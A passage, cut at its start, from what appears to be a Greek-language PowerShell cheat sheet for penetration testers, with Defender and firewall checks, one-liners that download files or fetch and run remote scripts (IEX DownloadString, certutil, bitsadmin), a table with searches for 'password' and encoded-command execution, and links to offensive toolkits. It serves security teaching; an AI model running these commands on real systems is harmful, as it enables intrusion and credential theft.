Get-MpComputerStatus | Select RealTimeProtectionEnabled,IoavProtectionEnabled

# Τείχος προστασίας
Get-NetFirewallProfile | Select Name,Enabled
```

### Λήψη αρχείων με εντολές μίας γραμμής

```powershell
# Λήψη αρχείου μέσω PowerShell
(New-Object Net.WebClient).DownloadFile("http://url/file","C:\file")
IEX (New-Object Net.WebClient).DownloadString("http://url/script.ps1")
Invoke-WebRequest -Uri "http://url/file" -OutFile "file"

# certutil
certutil -urlcache -split -f "http://url/file" file

# bitsadmin
bitsadmin /transfer job /download /priority high http://url/file C:\file
```

### Πίνακας εντολών

| Σκοπός | Εντολή |
| --------- | --------- |
| Τρέχων χρήστης | `whoami` |
| Όλοι οι χρήστες | `Get-LocalUser` |
| Μέλη διαχειριστικής ομάδας | `Get-LocalGroupMember Administrators` |
| Πληροφορίες συστήματος | `systeminfo` |
| Ρυθμίσεις IP | `Get-NetIPAddress` |
| Θύρες σε ακρόαση | `Get-NetTCPConnection -State Listen` |
| Διεργασίες | `Get-Process` |
| Υπηρεσίες | `Get-Service \| Where Status -eq Running` |
| Αναζήτηση αρχείων | `Get-ChildItem -Recurse -Filter "*.txt"` |
| Αναζήτηση περιεχομένου | `Select-String -Path "C:\*" -Pattern "password"` |
| Λήψη αρχείου | `(New-Object Net.WebClient).DownloadFile("url","file")` |
| Εκτέλεση κωδικοποιημένης εντολής | `powershell -enc <base64>` |

---

<a id="section-14"></a>

## 📚 Πηγές

- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [Nishang](https://github.com/samratashok/nishang)
- [PowerShell Empire](https://github.com/EmpireProject/Empire)
- [LOLBAS](https://lolbas-project.github.io/)
- [HackTricks — PowerShell](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)

### Σχετικοί οδηγοί
- [Mimikatz](../../Mimikatz/translations/README.el.md)
- [Ανύψωση δικαιωμάτων Windows](../../Windows-PrivEsc/translations/README.el.md)
- [Metasploit](../../Metasploit/translations/README.el.md)

---

<p align="center">
  <b>💻 PowerShell για συστηματικούς ελέγχους ασφάλειας.</b><br>
  <i>Κατανοήστε τις εντολές, τα αντικείμενα και τα δικαιώματα εκτέλεσης.</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
